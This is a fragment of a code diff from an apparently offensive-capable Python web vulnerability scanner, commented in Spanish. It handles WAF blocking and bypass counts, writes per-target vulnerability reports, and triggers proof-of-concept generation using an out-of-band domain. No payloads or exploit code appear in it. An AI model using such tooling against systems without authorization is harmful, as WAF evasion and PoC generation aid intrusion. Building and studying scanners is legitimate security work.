+                sys.stdout.write(f'\n\033[1;31m💾 Partial results saved to {fname if o else "output"}{Style.RESET_ALL}\n')
+                sys.stdout.flush()
+                if poc:
+                    sys.stdout.write(f'\033[1;31m[📋] PoCs generated for discovered vulnerabilities{Style.RESET_ALL}\n')
+                    sys.stdout.flush()
+                sys.stdout.write(f'\n\033[1;31m[❌] Scan terminated due to WAF blocking{Style.RESET_ALL}\n')
+                sys.stdout.flush()
+                sys.exit(1)
+            else:
+                sys.stdout.write(f'\033[1;33m[⏭️] Continuing with next target...{Style.RESET_ALL}\n')
+                sys.stdout.flush()
+                continue
+        else:
+            # Target no fue bloqueado - incrementar contador de éxito
+            if BLOCK_HANDLER_AVAILABLE and block_handlers[u] and block_handlers[u].block_count > 0:
+                # Hubo intentos de bypass exitosos
+                bypassed_urls += 1
+            else:
+                # No hubo WAF o no se bloqueó
+                safe_urls += 1
+        
+        # Guardar output por cada URL (append mode)
+        if o:
+            sys.stdout.write(f'\n\033[1;36m💾 Saving results for {u} to {fname}...\033[0m\n')
+            sys.stdout.flush()
+            
+            # Contar total de vulnerabilidades
+            total_vulns = sum(len(vulns) for vulns in vulnerabilities_by_type.values())
+            
+            if total_vulns > 0:
+                # Escribir directamente al archivo en modo append
+                try:
+                    with open(fname, 'a', encoding='utf-8') as f:
+                        f.write(f"\n[SCAN RESULTS FOR: {u}]\n")
+                        f.write(f"[TIMESTAMP: {time.strftime('%Y-%m-%d %H:%M:%S')}]\n")
+                        f.write(f"[TOTAL VULNERABILITIES FOUND: {total_vulns}]\n")
+                        f.write("-" * 60 + "\n")
+                        
+                        # Escribir vulnerabilidades organizadas por tipo
+                        for vuln_type, vulns in vulnerabilities_by_type.items():
+                            if vulns:
+                                f.write(f"\n=== {vuln_type} VULNERABILITIES ({len(vulns)} found) ===\n")
+                                for vuln in vulns:
+                                    if isinstance(vuln, str) and vuln.strip():
+                                        f.write(f"{vuln}\n")
+                                f.write("\n")
+                        
+                        f.write("-" * 60 + "\n\n")
+                        
+                except Exception as e:
+                    sys.stdout.write(f'\033[1;33m[⚠️] Warning: Could not write vulnerabilities to output file: {e}\033[0m\n')
+                    sys.stdout.flush()
+            else:
+                # Si no hay vulnerabilidades, agregar mensaje
+                try:
+                    with open(fname, 'a', encoding='utf-8') as f:
+                        f.write(f"[INFO] No vulnerabilities found for {u}\n")
+                except Exception as e:
+                    sys.stdout.write(f'\033[1;33m[⚠️] Warning: Could not write to output file: {e}\033[0m\n')
+                    sys.stdout.flush()
+            
+            # Agregar separador para la siguiente URL
+            try:
+                with open(fname, 'a', encoding='utf-8') as f:
+                    f.write(f"\n{'='*80}\n")
+                    f.write(f"SCAN COMPLETED FOR: {u}\n")
+                    f.write(f"TIMESTAMP: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
+                    f.write(f"{'='*80}\n\n")
+            except Exception as e:
+                sys.stdout.write(f'\033[1;33m[⚠️] Warning: Could not add separator to output file: {e}\033[0m\n')
+                sys.stdout.flush()
+        
+        # 🔍 GENERAR PoCs POR DOMINIO - ANTES DE LIMPIAR LAS VULNERABILIDADES
+        if poc and vulnerabilities_by_type:
+            # Extraer dominio de la URL actual
+            from urllib.parse import urlparse
+            parsed_url = urlparse(u)
+            domain = parsed_url.netloc.lower()
+            
+            # Crear diccionario de vulnerabilidades para este dominio
+            domain_vulnerabilities = {}
+            for vuln_type, vulns in vulnerabilities_by_type.items():
+                if vulns:  # Solo si hay vulnerabilidades de este tipo
+                    domain_vulnerabilities[vuln_type] = vulns
+            
+            # Generar PoCs para este dominio si hay vulnerabilidades
+            if domain_vulnerabilities:
+                sys.stdout.write(f'\n\033[1;33m[!] Generating PoCs for domain: {domain}\033[0m\n')
+                sys.stdout.flush()
+                generate_pocs_for_domain(domain_vulnerabilities, domain, oob_domain=oob_domain)
+        
+        # Limpiar lista de vulnerabilidades para la siguiente URL
+        urls_vulnerables.clear()
+        
+        # Limpiar el diccionario de vulnerabilidades por tipo para la siguiente URL
+        for vuln_type in vulnerabilities_by_type:
+            vulnerabilities_by_type[vuln_type].clear()
+        
+        # 🔄 RESET BLOCK COUNTERS FOR NEXT TARGET
+        if BLOCK_HANDLER_AVAILABLE and block_handlers[u]:
+            block_handlers[u].reset_block_count()
+            if u in result_savers and result_savers[u]:
+                result_savers[u].clear_partial_results()
+        
+        sys.stdout.write(f'\n\033[1;36m✅ Completed scan for {u} ({processed_urls}/{total_urls})\033[0m\n')
+        sys.stdout.flush()
+        sys.stdout.write('\033[1;36m' + '='*80 + '\033[0m\n')
+        sys.stdout.flush()
+
+    # 🔍 GENERAR PoCs AL FINAL - SOLO SI NO SE USÓ LISTA DE DOMINIOS
+    # Si se usó lista de dominios (-l), los PoCs ya se generaron por dominio
+    if poc and len(urls) == 1:  # Solo generar al final si es un solo dominio
+        # Verificar si hay vulnerabilidades reales
+        has_vulnerabilities = any(vulns for vulns in vulnerabilities_by_type.values())
+
+        if has_vulnerabilities:
+            sys.stdout.write(f'\n\033[1;33m[!] Generating Proof of Concepts (PoCs) for all vulnerabilities...\033[0m\n')
+            sys.stdout.flush()
+            # Usar la primera URL como target para el PoC
+            target_url = urls[0] if urls else "unknown"
+            generate_pocs_for_vulnerabilities(vulnerabilities_by_type, target_url, None, oob_domain=oob_domain)
+        else:
+            sys.stdout.write(f'\n\033[1;33m[!] No vulnerabilities found - skipping PoC generation\033[0m\n')
+            sys.stdout.flush()
+    elif poc and len(urls) > 1:
+        sys.stdout.write(f'\n\033[1;32m[!] PoCs already generated per domain during scanning\033[0m\n')
+        sys.stdout.flush()
+
+    sys.stdout.write('\033[1;31mCLOSE PROGRAM\033[0m\n')
+    sys.stdout.flush()
+    sys.exit(0)
 
 
